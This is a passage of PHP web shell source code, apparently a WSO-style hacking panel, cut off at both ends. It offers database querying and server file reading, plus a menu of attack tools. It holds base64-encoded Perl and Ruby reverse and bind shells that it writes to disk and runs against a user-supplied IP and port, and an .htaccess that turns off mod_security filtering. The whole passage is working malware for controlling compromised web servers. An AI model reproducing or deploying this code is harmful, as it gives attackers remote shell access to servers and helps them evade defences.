$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30); 
else
$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30'; 
echo "<br><br>"; 
} 
if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) { 
$db->query(@$_POST['p2']); 
if($db->res !== false) { 
$title = false; 
echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">'; 
$line = 1; 
while($item = $db->fetch())  { 
if(!$title) { 
echo '<tr>'; 
foreach($item as $key => $value) 
echo '<th>'.$key.'</th>'; 
reset($item); 
$title=true; 
echo '</tr><tr>'; 
$line = 2; 
} 
echo '<tr class="l'.$line.'">'; 
$line = $line==1?2:1; 
foreach($item as $key => $value) { 
if($value == null) 
echo '<td><i>null</i></td>'; 
else
echo '<td>'.nl2br(htmlspecialchars($value)).'</td>'; 
} 
echo '</tr>'; 
} 
echo '</table>'; 
} else { 
echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>'; 
} 
} 
echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>"; 
if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) 
echo htmlspecialchars($_POST['p2']); 
echo "</textarea><br/><input type=submit value='Execute'>"; 
echo "</td></tr>"; 
} 
echo "</table></form></center><br/>"; 
if($_POST['type']=='mysql') { 
$db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'"); 
if($db->fetch()) 
echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>"; 
} 
if(@$_POST['p1'] == 'loadfile') { 
$file = $db->loadFile($_POST['p2']); 
echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>'; 
} 
} else { 
echo htmlspecialchars($db->error()); 
} 
echo '</div>'; 
wsoFooter(); 
} 

if(isset($_GET['action']) && $_GET['action'] == 'beko'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Back Connect</span><center><br>';
if ($_REQUEST['cdirname']){
if(mkdir($_REQUEST['cdirname'],"0777")){alert("Directory Created !");}else{alert("Permission Denied !");}}
function bcn($ipbc,$pbc){
$bcperl="IyEvdXNyL2Jpbi9wZXJsCiMgQ29ubmVjdEJhY2tTaGVsbCBpbiBQZXJsLiBTaGFkb3cxMjAgLSB3
NGNrMW5nLmNvbQoKdXNlIFNvY2tldDsKCiRob3N0ID0gJEFSR1ZbMF07CiRwb3J0ID0gJEFSR1Zb
MV07CgogICAgaWYgKCEkQVJHVlswXSkgewogIHByaW50ZiAiWyFdIFVzYWdlOiBwZXJsIHNjcmlw
dC5wbCA8SG9zdD4gPFBvcnQ+XG4iOwogIGV4aXQoMSk7Cn0KcHJpbnQgIlsrXSBDb25uZWN0aW5n
IHRvICRob3N0XG4iOwokcHJvdCA9IGdldHByb3RvYnluYW1lKCd0Y3AnKTsgIyBZb3UgY2FuIGNo
YW5nZSB0aGlzIGlmIG5lZWRzIGJlCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFN
LCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTsKaWYgKCFjb25uZWN0
KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsIGluZXRfYXRvbigkaG9zdCkpKSB7ZGll
KCJbLV0gVW5hYmxlIHRvIENvbm5lY3QgISIpO30KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOwog
IG9wZW4oU1RET1VULCI+JlNFUlZFUiIpOwogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOwogIGV4
ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow==";
$opbc=fopen("bcc.pl","w");
fwrite($opbc,base64_decode($bcperl));
fclose($opbc);
system("perl bcc.pl $ipbc $pbc") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}
function wbp($wb){
$wbp="dXNlIFNvY2tldDsKJHBvcnQJPSAkQVJHVlswXTsKJHByb3RvCT0gZ2V0cHJvdG9ieW5hbWUoJ3Rj
cCcpOwpzb2NrZXQoU0VSVkVSLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsKc2V0c29j
a29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgcGFjaygibCIsIDEpKTsKYmlu
ZChTRVJWRVIsIHNvY2thZGRyX2luKCRwb3J0LCBJTkFERFJfQU5ZKSk7Cmxpc3RlbihTRVJWRVIs
IFNPTUFYQ09OTik7CmZvcig7ICRwYWRkciA9IGFjY2VwdChDTElFTlQsIFNFUlZFUik7IGNsb3Nl
IENMSUVOVCkKewpvcGVuKFNURElOLCAiPiZDTElFTlQiKTsKb3BlbihTVERPVVQsICI+JkNMSUVO
VCIpOwpvcGVuKFNUREVSUiwgIj4mQ0xJRU5UIik7CnN5c3RlbSgnY21kLmV4ZScpOwpjbG9zZShT
VERJTik7CmNsb3NlKFNURE9VVCk7CmNsb3NlKFNUREVSUik7Cn0g";
$opwb=fopen("wbp.pl","w");
fwrite($opwb,base64_decode($wbp));
fclose($opwb);
echo getcwd();
system("perl wbp.pl $wb") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}
function lbp($wb){
$lbp="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7JHBvcnQ9JEFSR1ZbMF07JHByb3RvPWdldHByb3Rv
YnluYW1lKCd0Y3AnKTskY21kPSJscGQiOyQwPSRjbWQ7c29ja2V0KFNFUlZFUiwgUEZfSU5FVCwg
U09DS19TVFJFQU0sICRwcm90byk7c2V0c29ja29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JF
VVNFQUREUiwgcGFjaygibCIsIDEpKTtiaW5kKFNFUlZFUiwgc29ja2FkZHJfaW4oJHBvcnQsIElO
QUREUl9BTlkpKTtsaXN0ZW4oU0VSVkVSLCBTT01BWENPTk4pO2Zvcig7ICRwYWRkciA9IGFjY2Vw
dChDTElFTlQsIFNFUlZFUik7IGNsb3NlIENMSUVOVCl7b3BlbihTVERJTiwgIj4mQ0xJRU5UIik7
b3BlbihTVERPVVQsICI+JkNMSUVOVCIpO29wZW4oU1RERVJSLCAiPiZDTElFTlQiKTtzeXN0ZW0o
Jy9iaW4vc2gnKTtjbG9zZShTVERJTik7Y2xvc2UoU1RET1VUKTtjbG9zZShTVERFUlIpO30g";
$oplb=fopen("lbp.pl","w");
fwrite($oplb,base64_decode($lbp));
fclose($oplb);
system("perl lbp.pl $wb") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}

if($_REQUEST['portbw']){
wbp($_REQUEST['portbw']);

}if($_REQUEST['portbl']){
lbp($_REQUEST['portbl']);
}
if($_REQUEST['ipcb'] && $_REQUEST['portbc']){
bcn($_REQUEST['ipcb'],$_REQUEST['portbc']);

}
echo "<p align='center'><font face='Tahoma' color='#007700' size='2pt' /><p align='center'><br>Ip : <input type=text name=ipcb value=".$_SERVER['REMOTE_ADDR'] ."> Port : <input type=text name=portbc value=5555> <input type=submit value=Connect></form>".$formp."<p align='center'><p align='center'><br><font face='Tahoma' color='#009900' size='2pt'> Windows Bind Port</font> <br>Port : <input type=text name=portbw value=5555> <input type=submit value=Connect></form>".$formp."<p align='center'> <br><font face='Tahoma' color='#009900' size='2pt'>Linux Bind Port</font> <br>Port : <input type=text name=portbl value=5555> <input type=submit value=Connect></form><br><br>".$end;exit;
}
if(isset($_GET['action']) && $_GET['action'] == 'rubybckconnnect'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
mkdir('rubrub', 0755);
chdir('rubrub');
$antinoooob = ".htaccess";
$morethannn = "$antinoooob";
$diamondd = fopen ($morethannn , 'w') or die ("diamondd a&#231;&#305;lamad&#305;!");
$gloryr = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";    
fwrite ( $diamondd , $gloryr ) ;
fclose ($diamondd);
//extract ruby reverse script
$vkffhd = 'cmVxdWlyZSAnc29ja2V0Jw0KcmVxdWlyZSAncGF0aG5hbWUnDQogDQpkZWYgdXNhZ2UNCiAgICAgICAgcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KICAgICAgICBwcmludCAicmV2ZXJzZSA6XHJcbiAgcnVieSAiICsgRmlsZS5iYXNlbmFtZShfX0ZJTEVfXykgKyAiIFtwb3J0XSBbaG9zdF1cclxuIg0KZW5kDQogDQpkZWYgc3Vja3MNCiAgICAgICAgc3Vja3MgPSBmYWxzZQ0KICAgICAgICBpZiBSVUJZX1BMQVRGT1JNLmRvd25jYXNlLm1hdGNoKCdtc3dpbnx3aW58bWluZ3cnKQ0KICAgICAgICAgICAgICAgIHN1Y2tzID0gdHJ1ZQ0KICAgICAgICBlbmQNCiAgICAgICAgcmV0dXJuIHN1Y2tzDQplbmQNCiANCmRlZiByZWFscGF0aChzdHIpDQogICAgICAgIHJlYWwgPSBzdHINCiAgICAgICAgaWYgRmlsZS5leGlzdHM/KHN0cikNCiAgICAgICAgICAgICAgICBkID0gUGF0aG5hbWUubmV3KHN0cikNCiAgICAgICAgICAgICAgICByZWFsID0gZC5yZWFscGF0aC50b19zDQogICAgICAgIGVuZA0KICAgICAgICBpZiBzdWNrcw0KICAgICAgICAgICAgICAgIHJlYWwgPSByZWFsLmdzdWIoL1wvLywiXFwiKQ0KICAgICAgICBlbmQNCiAgICAgICAgcmV0dXJuIHJlYWwNCmVuZA0KIA0KaWYgQVJHVi5sZW5ndGggPT0gMQ0KICAgICAgICBpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQogICAgICAgICAgICAgICAgcG9ydCA9IEludGVnZXIoQVJHVlswXSkNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHVzYWdlDQogICAgICAgICAgICAgICAgcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCiAgICAgICAgICAgICAgICBleGl0DQogICAgICAgIGVuZA0KICAgICAgICBzZXJ2ZXIgPSBUQ1BTZXJ2ZXIubmV3KCIiLCBwb3J0KQ0KICAgICAgICBzID0gc2VydmVyLmFjY2VwdA0KICAgICAgICBwb3J0ID0gcy5wZWVyYWRkclsxXQ0KICAgICAgICBuYW1lID0gcy5wZWVyYWRkclsyXQ0KICAgICAgICBzLnByaW50ICIqKiogY29ubmVjdGVkXHJcbiINCiAgICAgICAgcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQogICAgICAgIGJlZ2luDQogICAgICAgICAgICAgICAgaWYgbm90IHN1Y2tzDQogICAgICAgICAgICAgICAgICAgICAgICBmID0gcy50b19pDQogICAgICAgICAgICAgICAgICAgICAgICBleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICBzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIGxpbmUgPSBzLmdldHMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyrbQvDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBsaW5lLmNob21wID09ICIiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGluZSA9fiAvY2QgLiovaQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSByZWFscGF0aChsaW5lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXIuY2hkaXIobGluZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzaWYgbGluZSA9fiAvXHc6LiovaQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUuY2hvbXApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpci5jaGRpcihsaW5lLmNob21wKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJTy5wb3BlbihsaW5lLCJyIil7fGlvfHMucHJpbnQgaW8ucmVhZCArICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiJ9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgIHJlc2N1ZSBlcnJvckJybw0KICAgICAgICAgICAgICAgIHB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KICAgICAgICBlbnN1cmUNCiAgICAgICAgICAgICAgICBzLmNsb3NlDQogICAgICAgICAgICAgICAgcyA9IG5pbA0KICAgICAgICBlbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCiAgICAgICAgaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KICAgICAgICAgICAgICAgIHBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQogICAgICAgICAgICAgICAgaG9zdCA9IEFSR1ZbMV0NCiAgICAgICAgZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KICAgICAgICAgICAgICAgIHBvcnQgPSBJbnRlZ2VyKEFSR1ZbMV0pDQogICAgICAgICAgICAgICAgaG9zdCA9IEFSR1ZbMF0NCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHVzYWdlDQogICAgICAgICAgICAgICAgcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCiAgICAgICAgICAgICAgICBleGl0DQogICAgICAgIGVuZA0KICAgICAgICBzID0gVENQU29ja2V0Lm5ldygiI3tob3N0fSIsIHBvcnQpDQogICAgICAgIHBvcnQgPSBzLnBlZXJhZGRyWzFdDQogICAgICAgIG5hbWUgPSBzLnBlZXJhZGRyWzJdDQogICAgICAgIHMucHJpbnQgIioqKiBjb25uZWN0ZWRcclxuIg0KICAgICAgICBwdXRzICIqKiogY29ubmVjdGVkIDogI3tuYW1lfToje3BvcnR9Ig0KICAgICAgICBiZWdpbg0KICAgICAgICAgICAgICAgIGlmIG5vdCBzdWNrcw0KICAgICAgICAgICAgICAgICAgICAgICAgZiA9IHMudG9faQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhlYyBzcHJpbnRmKCIvYmluL3NoIC1pIFw8XCYlZCBcPlwmJWQgMlw+XCYlZCIsIGYsIGYsIGYpDQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBsaW5lID0gcy5nZXRzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIGVycm9yQnJvIGlmIGxpbmUgPX4gL15kaWVccj8kLw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxpbmUgPX4gL2NkIC4qL2kNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSBsaW5lLmdzdWIoL2NkIC9pLCAnJykuY2hvbXANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEZpbGUuZGlyZWN0b3J5rbhsaW5lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaW5lID0gcmVhbHBhdGgobGluZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlyLmNoZGlyKGxpbmUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEZpbGUuZGlyZWN0b3J5rbhsaW5lLmNob21wKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXIuY2hkaXIobGluZS5jaG9tcCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICByZXNjdWUgZXJyb3JCcm8NCiAgICAgICAgICAgICAgICBwdXRzICIqKiogI3tuYW1lfToje3BvcnR9IGRpc2Nvbm5lY3RlZCINCiAgICAgICAgZW5zdXJlDQogICAgICAgICAgICAgICAgcy5jbG9zZQ0KICAgICAgICAgICAgICAgIHMgPSBuaWwNCiAgICAgICAgZW5kDQplbHNlDQogICAgICAgIHVzYWdlDQogICAgICAgIGV4aXQNCmVuZA==';

$cvcvcv = fopen("revbackk.rb" ,"w+");
$write = fwrite ($cvcvcv ,base64_decode($vkffhd));
fclose($cvcvcv);
chmod("revbackk.rb",0755);

//extract php command shell
$merdeeeee = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBSdWJ5IEJhY2sgQ29ubmVjdCBTaGVsbDwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHl7IGJhY2tncm91bmQtY29sb3I6ICMyMjIyMjIgIWltcG9ydGFudDsgY29sb3I6ICMwMDk5MDA7IHRleHQtc2hhZG93OiMwMDAgMHB4IDJweCA3cHg7fSAgICAgIGF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7IGZvbnQtZmFtaWx5OiBUYWhvbWEsIEdlbmV2YTsgY29sb3I6IzAwNzcwMDsgcGFkZGluZzoycHggMnB4O30gICAgICBhOmhvdmVye2NvbG9yOiMwMDk5MDA7IHRleHQtc2hhZG93OiMwMGZmMDAgMHB4IDBweCAzcHg7fQkgIC5hcmVhIHsgY29sb3I6ICMwMGJiMDA7IGZvbnQtc2l6ZTogOXB0OyB0ZXh0LXNoYWRvdzojMDAwMDAwIDBweCAycHggN3B4OyBib3JkZXI6IHNvbGlkIDBweCAjMDA3NzAwOyBiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA5OTAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDAsMTE5LDApIDBweCAwcHggNHB4OyB9CSAgaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7ICBmb250LXdlaWdodDogYm9sZDsgdGV4dC1hbGlnbjogY2VudGVyOyAgdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsgIGJhY2tncm91bmQ6ICNhZWFlYWU7ICBiYWNrZ3JvdW5kLWNsaXA6IHBhZGRpbmctYm94OyAgYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgIGJvcmRlci1ib3R0b20tY29sb3I6ICMyMjNiNjY7ICBib3JkZXItcmFkaXVzOiA0cHg7ICBjdXJzb3I6IHBvaW50ZXI7ICBiYWNrZ3JvdW5kLWltYWdlOi13ZWJraXQtbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogLW8tbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiBsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCAjZWFlYWVhLCAjZDBkMGQwKTsgIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSBpbnB1dFt0eXBlPXRleHRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA5OTAwOyB0ZXh0LXNoYWRvdzogIzc3Nzc3NyAwcHggMHB4IDNweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzcwMDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDc3MDA7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsODUsODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDt9IGlucHV0W3R5cGU9c3VibWl0XTpob3ZlciwgaW5wdXRbdHlwZT10ZXh0XTpob3ZlcnsgY29sb3I6ICNmZmZmZmY7IHRleHQtc2hhZG93OiAjMDA2NjAwIDBweCAwcHggNHB4OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBkZDAwOyBib3JkZXI6IDFweCBzb2xpZCAjMDBkZDAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7fSBzZWxlY3R7IHBhZGRpbmc6IDNweDsgd2lkdGg6IDE2MnB4OyBjb2xvcjogIzAwYWEwMDsgdGV4dC1zaGFkb3c6IzAwMCAwcHggMnB4IDdweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzcwMDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwYWEwMDsgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsIDg1LCA4NSkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2IoODUsIDg1LCA4NSkgMHB4IDBweCA0cHg7fSBzZWxlY3Q6aG92ZXJ7IGJvcmRlcjogMXB4IHNvbGlkICMwMGRkMDA7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGRkMDA7ICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4O30gICAjY29tbW